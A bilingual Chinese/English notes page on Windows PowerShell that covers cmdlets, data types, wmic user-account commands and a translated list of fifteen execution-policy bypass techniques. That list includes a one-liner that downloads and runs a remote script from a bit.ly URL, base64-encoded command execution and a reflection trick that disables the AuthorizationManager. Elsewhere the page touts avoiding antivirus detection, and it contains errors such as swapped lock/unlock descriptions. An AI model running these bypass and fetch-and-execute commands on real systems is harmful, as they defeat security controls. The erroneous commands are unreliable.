# POWERSHELL 常用命令
Powershell

# Powershell 简明手册

Windows PowerShell是Microsoft创建的基于任务的自动化命令行Shell和相关脚本语言。它是Microsoft的新Shell，它将旧的命令提示符(CMD)功能与具有内置系统管理功能的新脚本指令集结合在一起。

它是专门为系统管理员设计的。在Linux OS中，PowerShell类似物称为Bash脚本。与其他接受和返回文本的Shell程序不同，它是在.NET框架，CLR(公共语言运行时)和DLR(动态语言运行时)的顶部构建的。因此，它可以接受并返回.NET Framework对象。

它可以帮助IT专业人员控制和自动化Windows操作系统以及在Windows服务器环境上运行的其他应用程序的管理。通过PowerShell，管理员可以通过对COM和WMI的完全访问权在远程和本地Windows系统上执行任务。

Windows PowerShell中的命令称为cmdlet，发音为“command-lets”，其中每个cmdlet代表特定的功能或基于任务的脚本。
像许多其他Shell程序一样，它可以我们访问计算机系统上的文件系统。而且，Windows PowerShell的提供程序能够访问另一个数据存储，例如注册表和数字签名证书存储。

## 基本概念
### core

PowerShell Core是开源的，可在Windows，Linux和Mac操作系统上使用。它建立在.NET核心上。
PowerShell核心在Linux和MacOS上以pwsh的形式启动，在Windows上以pwsh.exe的形式启动。

### 注释

与其他编程或脚本语言一样，可以在PowerShell中提供注释以用于文档目的。
在PowerShell中，有两种类型的注释：

- 单行注释多行注释或注释块
单行注释是在每行的开头键入井号#的注释。 #符号右边的所有内容都将被忽略。 如果在脚本中编写多行，则必须在每行的开头使用井号#符号。

- 多行注释在PowerShell 2.0或更高版本中，引入了多行注释或块注释。 

要注释多行，请将```<#```符号放在第一行的开头，将```#>```符号放在最后一行的末尾。

### PowerShell中的cmdlet

PowerShell中的cmdlet执行操作，并将Microsoft .NET Framework对象返回到管道中的下一个命令。 Cmdlet可以接收对象作为输入，也可以将结果输出为对象，这使其适合用作管道中的接收者。
如果编写cmdlet，则必须实现一个cmdlet类，该类派生自两个专门的cmdlet基类之一。 派生类必须：

声明一个属性，该属性将派生类标识为cmdlet。定义用属性标识的公共属性，这些属性将公共属性标识为cmdlet的参数。要处理记录，它会覆盖一种或多种输入处理方法。可以使用Import-Module cmdlet来直接加载包含该类的程序集，或者可以创建一个主机应用程序，该主机应用程序使用System.Management.Automation.Runspaces.Initialsessionstate API来加载该程序集。 两种方法都提供对cmdlet功能的编程访问和命令行访问。



## 特点
Native to Windows
Able to call the Windows API
Able to run commands without writing to the disk
Able to avoid detection by Anti-virus
Already flagged as “trusted” by most application white list solutions
A medium used to write many open source Pentest toolkits



## What is it?

Windows PowerShell is a Windows command-line shell designed especially for system administrators. Windows PowerShell includes an interactive prompt and a scripting environment that can be used independently or in combination.

Unlike most shells, which accept and return text, Windows PowerShell is built on top of the .NET Framework common language runtime (CLR) and the .NET Framework, and accepts and returns .NET Framework objects. This fundamental change in the environment brings entirely new tools and methods to the management and configuration of Windows.

Windows PowerShell introduces the concept of a cmdlet (pronounced "command-let"), a simple, single-function command-line tool built into the shell. You can use each cmdlet separately, but their power is realized when you use these simple tools in combination to perform complex tasks. Windows PowerShell includes more than one hundred basic core cmdlets, and you can write your own cmdlets and share them with other users.

Like many shells, Windows PowerShell gives you access to the file system on the computer. In addition, Windows PowerShell providers enable you to access other data stores, such as the registry and the digital signature certificate stores, as easily as you access the file system.

This Getting Started guide provides an introduction to Windows PowerShell: the language, the cmdlets, the providers, and the use of objects.

## Why use it?

Here, are some important reason for using Powershell:

- Powershell offers a well-integrated command-line experience for the operation system
- PowerShell allows complete access to all of the types in the .NET framework
- Trusted by system administrators.
- PowerShell is a simple way to manipulate server and workstation components
- It's geared toward system administrators by creating a more easy syntax
- PowerShell is more secure than running VBScript or other scripting languages

## Cmdlet

A cmdlet which is also called Command let is a is a lightweight command used in the Window base PowerShell environment. PowerShell invokes these cmdlets in the command prompt. You can create and invoke cmdlets command using PowerShell APIS.

- Cmdlets are different from commands in other command-shell environments in the following manners 
- Cmdlets are .NET Framework class objects It can't be executed separately
- Cmdlets can construct from as few as a dozen lines of code
- Parsing, output formatting, and error presentation are not handled by cmdlets
- Cmdlets process works on objects. So text stream and objects can't be passed as output for pipelining
- Cmdlets are record-based as so it processes a single object at a time

**Most of the PowerShell functionality comes from Cmdlet's which is always in verb-noun format and not plural. Moreover, Cmdlet's return objects not text. A cmdlet is a series of commands, which is more than one line, stored in a text file with a .psl extension.**

A cmdlet always consists of a verb and a noun, separated with a hyphen. Some of the verbs use for you to learn PowerShell is:

- Get — To get something
- Start — To run something
- Out — To output something
- Stop — To stop something that is running
- Set — To define something
- New — To create something

### A list of important PowerShell Commands:

#### 1 Get-Help

Help about PowerShell commands and topics.
```
# Example: Display help information about the command Format-Table

Get-Help Format-Table
```
#### 2 Get-Command

Get information about anything that can be invoked.
```
# Example: To generate a list of cmdlets, functions installed in your machine

Get-Command
```

#### 3 Get-Service

Finds all cmdlets with the word 'service' in it.
```
# Example: Get all services that begin with "vm"

Get-Service "vm*"
```

#### 4 Get- Member

Show what can be done with an object
```
# Example: Get members of the vm processes.

Get-Service "vm*" | Get-Member

```

#### Get-Module 

Shows packages of commands

#### Get-Content 

This cmdlet can take a file and process its contents and do something with it
```
Example: Create a Folder

New-Item -Path 'X:\Guru99' -ItemType Directory
```

## Data types

- Boolean
- Byte
  - 8 bits
- Char
  - 16 bit unsigned number from 0 to 65535
- Date
- Decimal
  - 128 bit decimal value
- Double
  - 64 bit floating point number
- Integer
  - 32 bit signed whole number
- Long
  - 64 bit signed whole number
- Object
- Short
  - 16 bit unsigned number
- Single
  - single-precision 32bit floating point number
- String
  - text

## Special Variables

| Special Variable| Description| 
|-|-|
| $Error| An array of error objects which display the most recent errors| 
| $Host| Display the name of the current hosting application| 
| $Profile| Stores entire path of a user profile for the default shell| 
| $PID| Stores the process identifier| 
| $PSUICulture| It holds the name of the current UI culture.| 
| $NULL| Contains empty or NULL value.| 
| $False| Contains FALSE value| 
| $True| Contains TRUE value| 

## PowerShell Scripts

Powershell scripts are store in .ps1 file. By default, you can't run a script by just double-clicking a file. This protects your system from accidental harm. 

### To execute a script:

#### Step 1: right-click it and click "Run with PowerShell."

Moreover, there is a policy which restricts script execution. You can see this policy by running the Get-ExecutionPolicy command.

You will get one of the following output:

- Restricted— No scripts are allowed. This is the default setting, so it will display first time when you run the command.
- AllSigned— You can run scripts signed by a trusted developer. With the help of this setting, a script will ask for confirmation that you want to run it before executing.
- RemoteSigned— You can run your or scripts signed by a trusted developer.
- Unrestricted— You can run any script which you wants to run

##### Steps to Change Execution Policy

Step 1) Open an elevated PowerShell prompt. Right Click on PowerShell and "Run as Administrator"

Step 2) Enter the Following commands

Get-ExecutionPolicy
Set-execution policy unrestricted
Enter Y in the prompt
Get-ExecutionPolicy


## Windows Management Framework(WMF)

Windows Management Framework (WMF) provides a consistent management interface for Windows. WMF provides a seamless way to manage various versions of Windows client and Windows Server. WMF installer packages contain updates to management functionality and are available for older versions of Windows.

WMF installation adds and/or updates the following features:

- Windows PowerShell
- Windows PowerShell Desired State Configuration (DSC)
- Windows PowerShell Integrated Script Environment (ISE)
- Windows Remote Management (WinRM)
- Windows Management Instrumentation (WMI)
- Windows PowerShell Web Services (Management OData IIS Extension)
- Software Inventory Logging (SIL)
- Server Manager CIM Provider

WMF 内嵌于windows 10、server 2016中。之前版本需要安装。WMF 5.1 Prerequisites for Windows Server 2008 R2 SP1 and Windows 7 SP1

## DSC

What Is DSC?
PowerShell DSC is a configuration management platform built into Windows that is based on open standards. DSC is flexible enough to function reliably and consistently in each stage of the deployment lifecycle (development, test, pre-production, production), and during scale-out.

DSC centers around configurations. A configuration is PowerShell script that describes an environment made up of computers, or nodes, with specific characteristics. These characteristics can be as simple as ensuring a specific Windows feature is enabled or as complex as deploying SharePoint.

DSC has monitoring and reporting built-in. If a system is no longer compliant, DSC can raise an alert and act to correct the system

## Sample scripts for system administration

https://docs.microsoft.com/en-us/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-6

## Working with objects

### Viewing Object Structure (Get-Member)

Because objects play such a central role in Windows PowerShell, there are several native commands designed to work with arbitrary object types. 
- The most important one is the ```Get-Member``` command.
- The simplest technique for analyzing the objects that a command returns is to pipe the output of that command to the ```Get-Member``` cmdlet. 

To see all the members of a Process object and page the output so you can view all of it, type:
```Get-Process | Get-Member | Out-Host -Paging```

We can make this long list of information more usable by filtering for elements we want to see.
```Get-Process | Get-Member -MemberType Properties```

## References
https://www.guru99.com/powershell-tutorial.html

https://www.tutorialspoint.com/powershell/powershell_overview.htm

https://docs.microsoft.com/en-us/powershell/scripting/getting-started/getting-started-with-windows-powershell?view=powershell-6



## 用户操作

### 使用wmic

#### 查看用户账户
`wmic useraccout`

`wmic useraccount get name,fullname`

#### 锁定账户

`wmic useraccount where name='someusername' set disabled=false`

#### 解锁账户
`wmic useraccount where name='someusername' set disabled=true`

#### 去除登录所需的密码要求
`wmic useraccount where name='username' set PasswordRequired=false`

#### 用户账户更名 Rename user account:

`wmic useraccount where name='username' rename newname`

#### 限制用户更改密码 Restrict user from changing password

`wmic useraccount where name='username' set passwordchangeable=false`


## 控制语句

### for 

#### for /f


powershell for /f 循环遍历文件，执行command操作 ，语法如下：
- `FOR /f ["options"] %%parameter IN (filenameset) DO command` 
- `FOR /F ["options"] %%parameter IN ("Text string to process") DO command`。

options：
- delims=XXX 分割字符，默认是一个空格
- skip=n  跳过文件开头的行数
- eol=; 在每行开始位置的特殊字符，用于显示一条注释，默认是分号;
- tokens=n 指定从每行读取多少条目，默认为1
- usebackq 使用几种引用风格，双引号用于长文件名，单引号用于要处理的字符串，反引号用于要执行的命令
- %%parameter 可重放的参数，在一批文件中使用%%G，在命令行使用%G




## 15种绕过 powershell 执行策略的方法
> source：https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/


默认情况下，windows中的ps1文件是不允许执行的。这里列示了15种可以绕过windows执行策略的方案，而不需要具有local administrator 权限。

查看执行权限可以使用命令 `Get-Excecution -List`  或`Get-ExecutionPolicy -List | Format-Table -AutoSize`, 默认都是Restricted。重要的一点是，这一设置并与意味着某种安全控制，它只是防止administrator误操作的一种办法。这也是为什么可以有方法可以绕过此策略。

假设我们想执行的语句为 `Write-Host "My voice is my passport, verify me."` ，它被写入了 .\runme.ps1。

直接在命令行上运行会报错：“cannot be loaded...”

下面尝试绕过：

### 直接拷贝脚本中命令到控制台运行

`PS c:\users\ss> Write-Host "My voice is my passport, verify me."`

### 使用`Echo`

```
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
```
这种技术，不会导致配置变化或写磁盘操作。

### 从文件读取并通过管道传给ps标准输入

```
Get-Content .runme.ps1 | PowerShell.exe -noprofile -

TYPE .runme.ps1 | PowerShell.exe -noprofile -
```


这种技术，不会导致配置变化或写磁盘操作。还可以从网络共享位置读取文件，而不写磁盘。
### 从url下载脚本并使用invoke表达式执行

这个技术从网上下载脚本并执行，也不写磁盘，不导致配置改变。很有用的技术。

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
```

iex开启了一个invoke表达式，


### 使用命令切换

这个技术很类似于拷贝粘贴执行一个脚本，但是它可以在没有交互下完成。简单命令可以顺利使用，复杂脚本可能会报错。

```
Powershell -command "Write-Host 'My voice is my passport, verify me.'"

Powershell -c "Write-Host 'My voice is my passport, verify me.'"
```

值得注意的是，你可以将他们放在批处理文件中，置于all users 的 startup 文件夹下，这样可以达到权限提升作用。

### 使用编码swith `-Enc` 或 `-EncodedCommand`

所有脚本可以通过unicode/base64编码后执行，这样可以避免不小心粘贴错误。这个技术也不会影响配置或写磁盘。

下面的例子使用了Posh-SecMod工具，它可以压缩编码命令大小。

```
$command = "Write-Host 'My voice is my passport, verify me.'" ; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) ; $encodedCommand = [Convert]::ToBase64String($bytes) ; powershell.exe -EncodedCommand $encodedCommand;
```

上面的 $encodedCommand 为：`VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA`

例2，使用编码字符串短命令

```
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
```

### 使用 invoke-command 命令

这是一种有趣的方式。它典型的执行是通过一个交互的ps console或使用command swith的一行命令，但非常酷的是它可用于执行于远程系统执行命令。这个技术也不会变更配置和写磁盘。

```
invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}

invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
```

### 使用 invoke-Expression 命令

这是有一个用于交互shell控制台执行或一行命令的方法。这个技术也不会变更配置和写磁盘。

Example 1: Full command using Get-Content

`Get-Content .runme.ps1 | Invoke-Expression`

Example 2: Short command using Get-Content

`GC .runme.ps1 | iex`

### 使用 Bypass 执行策略flag
When this Bypass flag is used Microsoft states that “Nothing is blocked and there are no warnings or prompts”. This technique does not result in a configuration change or require writing to disk.

`PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1`


### 使用 ‘Unrestricted’ 执行策略flag
This similar to the “Bypass” flag. However, when this flag is used Microsoft states that it “Loads all configuration files and runs all scripts. If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs.” This technique does not result in a configuration change or require writing to disk.

`PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1`

### 使用 “Remote-Signed” Execution Policy Flag
`PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1`

### Disable ExecutionPolicy by Swapping out the AuthorizationManager

This is really creative one I came across on http://www.nivot.org. The function below can be executed via an interactive PowerShell console or by using the “command” switch. Once the function is called it will swap out the “AuthorizationManager” with null. As a result, the execution policy is essentially set to unrestricted for the remainder of the session. This technique does not result in a persistant configuration change or require writing to disk. However, it the change will be applied for the duration of the session.

```
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1
```

### 为进程scope设置执行策略

As we saw in the introduction, the execution policy can be applied at many levels. This includes the process which you have control over. Using this technique the execution policy can be set to unrestricted for the duration of your Session. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the r007break blog.

`Set-ExecutionPolicy Bypass -Scope Process`

### 为CurrentUser Scope 设置 ExcutionPolicy

This option is similar to the process scope, but applies the setting to the current user’s environment persistently by modifying a registry key. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the r007break blog

`Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted`

### Set the ExcutionPolicy for the CurrentUser Scope via the Registry
In this example I’ve shown how to change the execution policy for the current user’s environment persistently by modifying a registry key directly.

`HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell`


## 字符串及编码

### 从base64 到 unicode 或ascii
```
PS C:\Users\leo> $a = [Convert]::FromBase64String("d2ViZ29hdDp3ZWJnb2F0")
PS C:\Users\leo> [System.Text.UnicodeEncoding]::Unicode.GetString($a)
敷杢慯㩴敷杢慯�
PS C:\Users\leo> [System.Text.ASCIIEncoding]::ASCII.GetString($a)
webgoat:webgoat

```

## 在文件中查找正则表达式匹配的行


例如：要在文件中查找正则表达式匹配的行

``` more .\crebas.sql |where {$_  -match "^alter table .+;$"}```


```

PS C:\Users\leo> $a = [Convert]::FromBase64String("d2ViZ29hdDp3ZWJnb2F0")
PS C:\Users\leo> [System.Text.UnicodeEncoding]::Unicode.GetString($a)
敷杢慯㩴敷杢慯�
PS C:\Users\leo> [System.Text.ASCIIEncoding]::ASCII.GetString($a)
webgoat:webgoat

```